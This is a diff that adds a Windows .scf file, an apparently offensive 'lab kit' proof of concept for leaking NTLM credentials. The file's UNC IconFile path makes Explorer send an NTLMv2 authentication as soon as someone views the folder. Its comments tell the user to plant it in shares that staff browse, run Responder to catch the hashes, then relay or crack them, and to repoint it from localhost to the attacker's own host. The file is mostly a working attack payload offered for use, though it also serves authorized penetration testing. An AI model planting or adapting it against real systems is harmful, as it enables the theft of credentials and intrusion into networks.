@@ -1,0 +1,27 @@
+[Shell]
+; Safe PoC -> x8bitranjit
+; ============================================================================
+; Windows .SCF NTLM-leak PoC - x8bitranjit lab style. Authorized testing only.
+;
+; WHAT THIS DEMONSTRATES: a .scf (Explorer Command File) with an IconFile on
+; a UNC path makes Windows Explorer authenticate (SMB/NTLMv2) to that host
+; the moment the FOLDER CONTAINING IT is viewed - no click, no open.
+; This is the classic responder-capture delivery: plant the .scf in a share/
+; upload directory staff browse, capture NTLMv2 with Responder, relay or crack.
+;
+; WHERE IT FIRES: Windows Explorer rendering the folder (SMB shares, web-
+; delivered zip extracted locally then viewed).
+;
+; WHAT TO EDIT: replace  localhost  with YOUR Responder/capture host
+; (shipped pointing at localhost = completely benign - the only auth attempt
+; goes to the victim's own machine). Real capture: run `responder -I eth0`
+; and set IconFile to \\YOUR-IP\benign\icon.ico
+;
+; CONFIRM (shipped form): viewing the folder in Explorer triggers a local SMB
+; connection to localhost (visible in Responder as an auth event for benign).
+; KIT CROSS-REF: RFI-006 (UNC/SMB include + NTLM capture/relay).
+; ============================================================================
+Command=2
+IconFile=\\localhost\benign-share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
